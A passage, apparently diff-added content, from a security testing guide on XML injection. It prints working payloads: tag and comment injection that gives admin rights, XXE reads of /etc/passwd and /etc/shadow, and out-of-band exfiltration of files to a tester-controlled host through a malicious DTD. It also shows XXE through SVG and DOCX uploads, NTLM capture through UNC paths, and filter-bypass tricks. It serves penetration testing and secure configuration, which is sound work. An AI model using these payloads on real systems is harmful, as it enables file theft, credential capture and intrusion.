+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s4tan@hell.com<span class="nt">&lt;/email&gt;&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;&lt;email&gt;</span>s4tan@hell.com
+</code></pre></div></div>
+
+<p>The backend will generate the following XML:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
+    <span class="nt">&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>The resulting XML is well-formed. Furthermore, it is likely that the XML parser might process the duplicate <code class="language-plaintext highlighter-rouge">&lt;userid&gt;</code> tags sequentially and overwrite the initial value (<code class="language-plaintext highlighter-rouge">500</code>) with the last provided value (<code class="language-plaintext highlighter-rouge">0</code>, often representing an admin ID). In this case, the tester has successfully injected a user with administrative privileges.</p>
+
+<p>The only problem is that the <code class="language-plaintext highlighter-rouge">userid</code> and <code class="language-plaintext highlighter-rouge">email</code> tags appear twice. Often, XML documents are validated against a schema or a Document Type Definition (DTD) and will be rejected if they do not comply with strict cardinality rules.</p>
+
+<p>Let’s suppose the backend XML document is strictly specified by a DTD that enforces exactly one <code class="language-plaintext highlighter-rouge">userid</code> and one <code class="language-plaintext highlighter-rouge">email</code> tag per user:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE user [
+    &lt;!ELEMENT user (username,password,userid,email) &gt;</span>
+    <span class="cp">&lt;!ELEMENT username (#PCDATA) &gt;</span>
+    <span class="cp">&lt;!ELEMENT password (#PCDATA) &gt;</span>
+    <span class="cp">&lt;!ELEMENT userid (#PCDATA) &gt;</span>
+    <span class="cp">&lt;!ELEMENT email (#PCDATA) &gt;</span>
+]&gt;
+</code></pre></div></div>
+
+<p>In this case, the simple tag injection attack shown above will fail validation before any processing occurs.</p>
+
+<p>However, this defense can be bypassed if the tester controls the values of multiple nodes. By injecting an XML comment start sequence (<code class="language-plaintext highlighter-rouge">&lt;!--</code>) in one field and an XML comment end sequence (<code class="language-plaintext highlighter-rouge">--&gt;</code>) in another, the tester can hide the original, server-generated nodes.</p>
+
+<p>For example, the tester provides the following payloads for the inputs:</p>
+
+<ul>
+  <li>Username: tony</li>
+  <li>Password: <code class="language-plaintext highlighter-rouge">Un6R34kb!e&lt;/password&gt;&lt;!--</code></li>
+  <li>Email: <code class="language-plaintext highlighter-rouge">--&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;email&gt;s4tan@hell.com</code></li>
+</ul>
+
+<p>The backend application concatenates these into the XML structure:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span><span class="c">&lt;!--&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;--&gt;</span><span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>The original <code class="language-plaintext highlighter-rouge">&lt;userid&gt;500&lt;/userid&gt;</code> node and the duplicate tags have been successfully commented out, leaving only the injected <code class="language-plaintext highlighter-rouge">&lt;userid&gt;0&lt;/userid&gt;</code>. The document now complies with its strict DTD rules, and the privilege escalation is successful.</p>
+
+<h3 id="xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</h3>
+
+<p>The set of valid XML entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote system. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service, gain unauthorized access to files, scan internal networks, and perform Server-Side Request Forgery (SSRF).</p>
+
+<p>To test for basic XXE vulnerabilities, one can inject a <code class="language-plaintext highlighter-rouge">DOCTYPE</code> declaration with an external entity into the XML payload:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE user [ 
+    &lt;!ELEMENT user ANY &gt;</span>
+    <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</span>
+]&gt;
+<span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Note: The <code class="language-plaintext highlighter-rouge">DOCTYPE</code> name (<code class="language-plaintext highlighter-rouge">user</code>) matches the document’s actual root element, and the <code class="language-plaintext highlighter-rouge">ELEMENT</code> declaration refers to that same root element - a mismatched or leftover <code class="language-plaintext highlighter-rouge">DOCTYPE</code>/<code class="language-plaintext highlighter-rouge">ELEMENT</code> name from a different example (a common copy-paste mistake when adapting XXE payloads to a new endpoint) will still be tolerated by most non-validating parsers, but keeping them consistent avoids failures against any parser that does perform DTD validation.</p>
+</blockquote>
+
+<p>This test can trigger a Denial of Service on Unix systems if the XML parser attempts to resolve the entity by reading from <code class="language-plaintext highlighter-rouge">/dev/random</code>, potentially blocking indefinitely (or consuming significant resources) while trying to substitute the entity value.</p>
+
+<p>Other useful payloads to test for local file disclosure include:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/shadow" &gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini" &gt;</span>
+<span class="cp">&lt;!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" &gt;</span>
+</code></pre></div></div>
+
+<h3 id="blind-xxe">Blind XXE</h3>
+
+<p>In many real-world cases the application does not reflect the value of an external entity back into the HTTP response, so the classic <code class="language-plaintext highlighter-rouge">/etc/passwd</code>-in-response example above does not directly apply. This is known as <strong>Blind XXE</strong>. The vulnerability is still present and still exploitable, but detection and data exfiltration require out-of-band (OOB) techniques or, when OOB traffic is blocked, an error-based technique.</p>
+
+<h4 id="out-of-band-oob-detection-via-parameter-entities">Out-of-Band (OOB) Detection via Parameter Entities</h4>
+
+<p>Some parsers or WAF rules block classic general entities (<code class="language-plaintext highlighter-rouge">&amp;xxe;</code>) but do not restrict <strong>parameter entities</strong>, which can only be referenced inside a DTD and are declared with a <code class="language-plaintext highlighter-rouge">%</code> instead of <code class="language-plaintext highlighter-rouge">&amp;</code>. A tester can use a parameter entity to force the target server to make an outbound DNS/HTTP request to an attacker-controlled listener (e.g. Burp Collaborator, <code class="language-plaintext highlighter-rouge">interact.sh</code>, or a simple netcat/HTTP listener), confirming the injection is live even though nothing is reflected:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://&lt;tester-controlled-host&gt;</span>/collect"&gt;
+  %xxe;
+]&gt;
+<span class="nt">&lt;foo&gt;</span>test<span class="nt">&lt;/foo&gt;</span>
+</code></pre></div></div>
+
+<p>A resulting DNS lookup or HTTP hit on the listener confirms that the XML parser resolves external entities, i.e. the application is vulnerable, even with a fully blind response.</p>
+
+<h4 id="out-of-band-data-exfiltration-via-a-malicious-external-dtd">Out-of-Band Data Exfiltration via a Malicious External DTD</h4>
+
+<p>Once OOB interaction is confirmed, the tester can escalate from detection to actual file exfiltration by hosting a malicious external DTD on an attacker-controlled server and chaining parameter entities to smuggle file contents out inside a follow-up request.</p>
+
+<p>Malicious DTD hosted at <code class="language-plaintext highlighter-rouge">http://&lt;tester-controlled-host&gt;/evil.dtd</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://&lt;tester-controlled-host&gt;</span>/?data=%file;'&gt;"&gt;
+%eval;
+%exfil;
+</code></pre></div></div>
+
+<p>Payload sent to the target application:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://&lt;tester-controlled-host&gt;</span>/evil.dtd"&gt;
+  %xxe;
+]&gt;
+<span class="nt">&lt;foo&gt;</span>test<span class="nt">&lt;/foo&gt;</span>
+</code></pre></div></div>
+
+<p>When the target parses this document, it fetches <code class="language-plaintext highlighter-rouge">evil.dtd</code>, reads the local file into the <code class="language-plaintext highlighter-rouge">%file;</code> entity, and then makes a second outbound request embedding the file contents as a query parameter - which the tester captures on their listener. Because URLs cannot safely carry arbitrary binary/newline data, this technique is normally limited to single-line, URL-safe text; for binary files or files containing characters that break the URL, testers commonly combine this with a language-specific wrapper (e.g. PHP’s <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=</code>) to base64-encode the file content before exfiltration, where the target stack supports it.</p>
+
+<h4 id="error-based-exfiltration-via-a-remote-external-dtd">Error-Based Exfiltration via a Remote External DTD</h4>
+
+<p>This variant still requires the target to make one outbound connection (to fetch the tester’s DTD), but unlike the OOB technique above it does not require the attacker’s server to receive a <em>second</em> request carrying the data - the file contents are leaked back through the application’s own error response instead of a network callback. This is useful when outbound connections are allowed but the response body from the second exfiltration request would never reach the tester.</p>
+
+<p>DTD hosted at <code class="language-plaintext highlighter-rouge">http://&lt;tester-controlled-host&gt;/error.dtd</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;</span>"&gt;
+%eval;
+%error;
+</code></pre></div></div>
+
+<p>Payload:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "http://&lt;tester-controlled-host&gt;</span>/error.dtd"&gt;
+  %xxe;
+]&gt;
+<span class="nt">&lt;foo&gt;</span>test<span class="nt">&lt;/foo&gt;</span>
+</code></pre></div></div>
+
+<p>The parser fetches the DTD, attempts to resolve a nonexistent path built from the concatenation of the target file’s contents, fails, and - depending on the parser and how verbose the application’s error handling is - throws an exception whose message discloses the attempted (and therefore now file-content-bearing) path. If the application returns raw parser errors in its response, this reveals the file contents directly.</p>
+
+<h4 id="error-based-exfiltration-by-repurposing-a-local-dtd-zero-outbound-connectivity">Error-Based Exfiltration by Repurposing a Local DTD (Zero Outbound Connectivity)</h4>
+
+<p>The technique above still needs one outbound fetch. If the target environment truly has no outbound connectivity at all (fully egress-filtered), that is not an option either - and a fully <em>internal</em> DOCTYPE normally cannot redefine a parameter entity inside another parameter entity’s definition (the XML spec permits this only within external DTDs, and most parsers enforce it).</p>
+
+<p>A reliable workaround is to reference a DTD file that already exists on the target’s own local filesystem as the “external” DTD (loaded via <code class="language-plaintext highlighter-rouge">file://</code> instead of <code class="language-plaintext highlighter-rouge">http://</code>), and then redefine one of the entities that DTD already declares. Because the reused DTD is technically still “external” from the parser’s point of view (even though no network access occurs), the parameter-entity-redefinition trick becomes legal again, and the same error-based leak can be triggered with zero outbound connectivity.</p>
+
+<p>This requires knowing the path of a DTD file that is actually present on the server. Common candidates worth probing for include XML-processing libraries bundled with the application server (application/servlet DTDs shipped inside JARs), and OS-level DTDs such as the GNOME/Yelp documentation DTD on many Linux systems (<code class="language-plaintext highlighter-rouge">/usr/share/yelp/dtd/docbookx.dtd</code>). A tester can enumerate candidates by submitting a payload that only loads the DTD (without redefining anything) - if the file doesn’t exist, the parser throws a file-not-found error, so a wordlist of known DTD paths can be probed one at a time.</p>
+
+<p>Example, assuming <code class="language-plaintext highlighter-rouge">/usr/local/app/schema.dtd</code> exists on the target and defines an entity called <code class="language-plaintext highlighter-rouge">custom_entity</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;</span>
+  <span class="cp">&lt;!ENTITY % custom_entity '
+    &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span>
+    <span class="cp">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>"&gt;
+    <span class="ni">&amp;#x25;</span>eval;
+    <span class="ni">&amp;#x25;</span>error;
+  '&gt;
+  %local_dtd;
+]&gt;
+</code></pre></div></div>
+
+<p>Note the redefined value of <code class="language-plaintext highlighter-rouge">custom_entity</code> is written using numeric character references (<code class="language-plaintext highlighter-rouge">&amp;#x25;</code> for <code class="language-plaintext highlighter-rouge">%</code>, <code class="language-plaintext highlighter-rouge">&amp;#x26;</code> for <code class="language-plaintext highlighter-rouge">&amp;</code>, <code class="language-plaintext highlighter-rouge">&amp;#x27;</code> for <code class="language-plaintext highlighter-rouge">'</code>) rather than the literal characters. This is necessary, not stylistic: the replacement text is itself parsed as DTD markup once substituted in, so a literal <code class="language-plaintext highlighter-rouge">%</code> or <code class="language-plaintext highlighter-rouge">&amp;</code> inside it would be expanded immediately instead of surviving intact until the redefinition actually takes effect - the numeric references defer that expansion to the correct stage.</p>
+
+<p>This loads the local DTD, overrides its <code class="language-plaintext highlighter-rouge">custom_entity</code> definition with the error-based exfiltration payload, and then invokes <code class="language-plaintext highlighter-rouge">%local_dtd;</code> so the parser processes the redefined entity - triggering the same file-content-in-error-message leak as above, but without a single byte of network traffic leaving the server. Tools such as the <a href="https://github.com/GoSecure/dtd-finder">dtd-finder</a> project maintain lists of known DTD file paths (and can scan a filesystem or container image for DTDs actually present) to speed up this search.</p>
+
+<h3 id="xinclude-attacks">XInclude Attacks</h3>
+
+<p>Sometimes the tester only controls a single value that is later embedded into a larger, server-generated XML document (for example, a form field that ends up inside a backend SOAP request). In that case the tester cannot control or inject a <code class="language-plaintext highlighter-rouge">&lt;!DOCTYPE&gt;</code> declaration, which rules out the classic entity-based attacks above. <strong>XInclude</strong> is a separate part of the XML specification that lets one XML document pull in content from another source, and it can be triggered from within an ordinary data value - no DOCTYPE required:</p>
+
+<pre><code class="language-txt">productId=&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;&amp;storeId=1
+</code></pre>
+
+<p>If the backend embeds this value into its own XML document unescaped and its parser has XInclude processing enabled, the referenced file’s contents are inlined at that point in the resulting document.</p>
+
+<h3 id="xxe-via-file-upload">XXE via File Upload</h3>
+
+<p>Many applications accept uploads of file formats that are XML-based or that contain embedded XML parts, even when the upload UI only advertises “documents” or “images.” These are frequently overlooked as injection points because the tester is not interacting with an obvious XML API.</p>
+
+<h4 id="svg">SVG</h4>
+
+<p>SVG is an XML-based image format. If an application accepts SVG uploads (or accepts arbitrary image formats and happens to process SVG), a crafted SVG file can carry a DOCTYPE with an external entity that is resolved during rendering/processing, and depending on the workflow, the resolved value may even be rendered visibly inside the generated image:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt;</span> ]&gt;
+<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"128px"</span> <span class="na">height=</span><span class="s">"128px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;text</span> <span class="na">font-size=</span><span class="s">"16"</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"16"</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+<span class="nt">&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<h4 id="office-open-xml-documents-docx--xlsx--pptx">Office Open XML Documents (DOCX / XLSX / PPTX)</h4>
+
+<p>Modern office formats are ZIP archives containing multiple XML parts. A tester can unzip a legitimate sample file, inject a DOCTYPE/entity into one of the internal XML parts, and re-zip it, then upload it to any feature that parses or converts the document server-side (preview generation, text extraction, format conversion, etc.).</p>
+
+<p>Example: editing <code class="language-plaintext highlighter-rouge">word/document.xml</code> inside a <code class="language-plaintext highlighter-rouge">.docx</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
+<span class="nt">&lt;w:document&gt;</span>
+  <span class="nt">&lt;w:body&gt;</span>
+    <span class="nt">&lt;w:p&gt;&lt;w:r&gt;&lt;w:t&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/w:t&gt;&lt;/w:r&gt;&lt;/w:p&gt;</span>
+  <span class="nt">&lt;/w:body&gt;</span>
+<span class="nt">&lt;/w:document&gt;</span>
+</code></pre></div></div>
+
+<p>The same approach applies to <code class="language-plaintext highlighter-rouge">xl/workbook.xml</code> in <code class="language-plaintext highlighter-rouge">.xlsx</code> files and to the equivalent parts in <code class="language-plaintext highlighter-rouge">.pptx</code> files. This is a useful check for any endpoint that ingests office documents for indexing, thumbnailing, or conversion - such pipelines are often built on older or loosely-configured XML libraries even when the main application’s own API layer has been hardened.</p>
+
+<h4 id="other-xml-based-formats">Other XML-Based Formats</h4>
+
+<p>Testers should also consider less obvious XML-based formats that an application might accept as input, including XLIFF (translation exchange files), RSS/Atom feeds, SOAP envelopes, and any custom import format documented as “XML” or “based on XML.” Any of these can carry the same DOCTYPE/entity or XInclude payloads shown above.</p>
+
+<h3 id="escalating-impact-ssrf-and-credential-capture">Escalating Impact: SSRF and Credential Capture</h3>
+
+<p>XXE is not limited to local file disclosure - the same external-entity mechanism is a request-forgery primitive, so testers should assess impact beyond <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+
+<ul>
+  <li><strong>SSRF to cloud metadata services.</strong> In cloud-hosted targets, pointing an entity at the instance metadata endpoint (e.g. <code class="language-plaintext highlighter-rouge">http://169.254.169.254/...</code> on AWS) can disclose temporary credentials - but note that AWS’s current default, IMDSv2, requires a <code class="language-plaintext highlighter-rouge">PUT</code> request plus a custom header to obtain a session token before any <code class="language-plaintext highlighter-rouge">GET</code> will succeed, and XXE-driven SSRF (via a <code class="language-plaintext highlighter-rouge">SYSTEM</code> identifier) can typically only issue a plain <code class="language-plaintext highlighter-rouge">GET</code>. In practice this means a classic XXE-&gt;metadata credential grab now mostly only works against older or explicitly misconfigured instances that still have IMDSv1 enabled (<code class="language-plaintext highlighter-rouge">HttpTokens</code> not set to <code class="language-plaintext highlighter-rouge">required</code>) - check the instance’s metadata options rather than assuming the endpoint is exploitable by default. Azure’s and GCP’s equivalent metadata endpoints similarly require specific headers (<code class="language-plaintext highlighter-rouge">Metadata: true</code> / <code class="language-plaintext highlighter-rouge">Metadata-Flavor: Google</code>) that a bare <code class="language-plaintext highlighter-rouge">SYSTEM "http://..."</code> entity cannot set, for the same reason. Even where direct credential theft is blocked, reaching the metadata endpoint at all is still useful for confirming SSRF and probing which cloud the target runs on.</li>
+  <li><strong>Internal network/port scanning.</strong> Differences in response time or error messages between reachable and unreachable internal hosts/ports can be used to map internal network topology through the vulnerable server.</li>
+  <li><strong>Credential capture via UNC paths (Windows).</strong> On Windows-hosted parsers, pointing an entity at a UNC path (<code class="language-plaintext highlighter-rouge">file://///attacker-ip/share/x</code>) can cause the server to attempt SMB authentication to a tester-controlled listener, leaking the service account’s NTLM hash for offline cracking.</li>
+</ul>
+
+<p>These impacts should be reflected in how a finding’s severity is scored, per the Test Objectives above - a blind, file-read-only XXE and an XXE that yields cloud credentials are very different findings even though the injection point is identical.</p>
+
+<h3 id="filter-and-waf-bypass-techniques">Filter and WAF Bypass Techniques</h3>
+
+<p>If straightforward <code class="language-plaintext highlighter-rouge">&lt;!DOCTYPE</code> payloads are being blocked or stripped, the following variations are worth trying before concluding the application is not vulnerable:</p>
+
+<ul>
+  <li><strong>Encoding the payload:</strong> Some parsers accept alternative input encodings (e.g. UTF-7) that do not contain the literal byte sequences a filter is matching on, but are still decoded and parsed as XML by the underlying library before any filter logic runs. Re-encoding the entire payload can bypass naive signature-based filters that only look for plaintext <code class="language-plaintext highlighter-rouge">&lt;!DOCTYPE</code> or <code class="language-plaintext highlighter-rouge">&lt;!ENTITY</code>.</li>
+  <li><strong>Data URIs (<code class="language-plaintext highlighter-rouge">data:</code>):</strong> Where the parser’s protocol handling permits it, a base64-encoded payload can be smuggled in via a <code class="language-plaintext highlighter-rouge">data:text/plain;base64,...</code> parameter entity, keeping the actual DTD content out of the request in plaintext form.</li>
+  <li><strong>Alternate protocol wrappers instead of <code class="language-plaintext highlighter-rouge">file://</code>:</strong> On PHP-based stacks, wrappers such as <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=</code> both bypass naive <code class="language-plaintext highlighter-rouge">file://</code>-string filters and solve the separate problem of exfiltrating binary/multi-line content (see the OOB exfiltration note above). On Java-based stacks, the <code class="language-plaintext highlighter-rouge">jar:</code> protocol can be used to reach files inside a ZIP/JAR archive, including one fetched from a remote URL, and is useful when direct <code class="language-plaintext highlighter-rouge">file://</code> access is blocked but archive-based access is not.</li>
+  <li><strong>Splitting the trust between two encodings:</strong> A small number of parsers will decode numeric HTML character references inside an entity value before re-parsing it as a DTD fragment; where this applies, expressing the blocked keywords as numeric character references can slip past a filter that only recognizes the literal string.</li>
+</ul>
+
+<p>As always with filter bypasses, confirm the underlying parser/version actually exhibits the behavior being relied on rather than assuming any of the above works universally - these are leads to test, not guaranteed bypasses.</p>
+
+<h3 id="a-note-on-modern-parser-defaults">A Note on Modern Parser Defaults</h3>
+
+<p>Many current XML parsing libraries and frameworks now ship with external entity resolution disabled by default, or provide a documented “secure processing” flag that testers should confirm is actually in use (this does <strong>not</strong> mean XXE testing can be skipped - see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XML External Entity (XXE) Prevention Cheat Sheet</a>). In practice, exploitable XXE today is most often found where:</p>
+
+<ul>
+  <li>A parser was configured securely for the application’s primary API, but a secondary code path (file upload processing, document conversion, report generation, legacy SOAP endpoint) uses a different, unhardened parser instance.</li>
+  <li>DTDs are disabled but XInclude processing was left enabled (these are typically separate configuration flags).</li>
+  <li>A third-party library or dependency embeds its own XML parsing with insecure defaults.</li>
+  <li>Older or custom-built parsers (embedded devices, legacy Java/C stacks) are still in use.</li>
+</ul>
+
+<p>Testers should therefore test every XML-consuming code path independently rather than assuming that securing one API endpoint secures the whole application.</p>
+
+<h2 id="white-box-testing">White-Box Testing</h2>
+
+<p>When reviewing source code, check if the XML parsers are securely configured to disable <code class="language-plaintext highlighter-rouge">DOCTYPE</code>, external DTDs, and external parameter entities.</p>
+
+<p>For comprehensive secure configuration snippets across all languages, refer to the <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a>.</p>
+
+<h3 id="java">Java</h3>
+
+<p>The following Java APIs may be vulnerable to XXE if not configured properly:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">javax.xml.parsers.DocumentBuilder</code> / <code class="language-plaintext highlighter-rouge">DocumentBuilderFactory</code></li>
+  <li><code class="language-plaintext highlighter-rouge">javax.xml.parsers.SAXParser</code> / <code class="language-plaintext highlighter-rouge">SAXParserFactory</code></li>
+  <li><code class="language-plaintext highlighter-rouge">javax.xml.stream.XMLInputFactory</code></li>
+  <li><code class="language-plaintext highlighter-rouge">javax.xml.transform.TransformerFactory</code> / <code class="language-plaintext highlighter-rouge">SAXTransformerFactory</code></li>
+  <li><code class="language-plaintext highlighter-rouge">org.xml.sax.XMLReader</code> / <code class="language-plaintext highlighter-rouge">EntityResolver</code></li>
+  <li><code class="language-plaintext highlighter-rouge">org.dom4j.io.SAXReader</code></li>
+  <li><code class="language-plaintext highlighter-rouge">org.jdom2.input.SAXBuilder</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Xerces</code>: <code class="language-plaintext highlighter-rouge">DOMParser</code>, <code class="language-plaintext highlighter-rouge">SAXParser</code>, <code class="language-plaintext highlighter-rouge">XMLParser</code></li>
+</ul>
+
+<blockquote>
+  <p><strong>Note:</strong> Third-party libraries that process XML-based formats (such as Apache POI for OOXML documents) can also introduce XXE and XEE vulnerabilities. When reviewing code, look for historical vulnerability keywords such as <code class="language-plaintext highlighter-rouge">XSSFExportToXml</code> or insecure OPC SAX configurations. Always verify the library version against known security advisories (e.g., <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-22766/Apache-POI.html">Apache POI CVE Details</a>) rather than assuming they are safe by default.</p>
+</blockquote>
+
+<h3 id="c--c">C / C++</h3>
+
+<p>The following source code keywords may indicate vulnerable implementations:</p>
+
+<ul>
+  <li><strong>libxml2:</strong> <code class="language-plaintext highlighter-rouge">xmlCtxtReadMemory</code>, <code class="language-plaintext highlighter-rouge">xmlCtxtUseOptions</code>, <code class="language-plaintext highlighter-rouge">xmlParseInNodeContext</code>, <code class="language-plaintext highlighter-rouge">xmlReadDoc</code>, <code class="language-plaintext highlighter-rouge">xmlReadFd</code>, <code class="language-plaintext highlighter-rouge">xmlReadFile</code>, <code class="language-plaintext highlighter-rouge">xmlReadIO</code>, <code class="language-plaintext highlighter-rouge">xmlReadMemory</code>, <code class="language-plaintext highlighter-rouge">xmlCtxtReadDoc</code>, <code class="language-plaintext highlighter-rouge">xmlCtxtReadFd</code>, <code class="language-plaintext highlighter-rouge">xmlCtxtReadFile</code>, <code class="language-plaintext highlighter-rouge">xmlCtxtReadIO</code></li>
+  <li><strong>libxerces-c:</strong> <code class="language-plaintext highlighter-rouge">XercesDOMParser</code>, <code class="language-plaintext highlighter-rouge">SAXParser</code>, <code class="language-plaintext highlighter-rouge">SAX2XMLReader</code></li>
+</ul>
+
+<h3 id="python">Python</h3>
+
+<p>The following packages and functions should be reviewed:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">xml.etree.ElementTree</code> and <code class="language-plaintext highlighter-rouge">xml.dom.minidom</code>: While these do not expand external entities by default in current CPython versions, they can still be susceptible to entity-expansion-style Denial of Service (DoS) and other edge cases.</li>
+  <li><code class="language-plaintext highlighter-rouge">lxml</code>: Check if the parser is explicitly instantiated with <code class="language-plaintext highlighter-rouge">resolve_entities=True</code> (and <code class="language-plaintext highlighter-rouge">no_network=False</code>), which enables XXE.</li>
+  <li><strong>Recommendation:</strong> <code class="language-plaintext highlighter-rouge">defusedxml</code> is the standard drop-in replacement for standard-library XML modules to uniformly mitigate XXE and DoS risks.</li>
+</ul>
+
+<h3 id="nodejs--javascript">Node.js / JavaScript</h3>
+
+<p>Look for legacy or loosely configured libraries:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">libxmljs</code>: External entity substitution is off by default; look for an explicit <code class="language-plaintext highlighter-rouge">{ noent: true }</code> option, which re-enables it.</li>
+  <li><code class="language-plaintext highlighter-rouge">xml2js</code>: This library relies on pure JavaScript parsers like <code class="language-plaintext highlighter-rouge">sax-js</code> under the hood. While it does not resolve external entities by default, it can be vulnerable to DoS attacks. Check if the <code class="language-plaintext highlighter-rouge">strict</code> option is explicitly set to <code class="language-plaintext highlighter-rouge">false</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">xml2json</code>: This module uses <code class="language-plaintext highlighter-rouge">node-expat</code> (C/C++ bindings to the Expat parser) under the hood. While Expat is generally safe from classic file-disclosure XXE out of the box, it can be susceptible to XML Entity Expansion (DoS) if not explicitly restricted.</li>
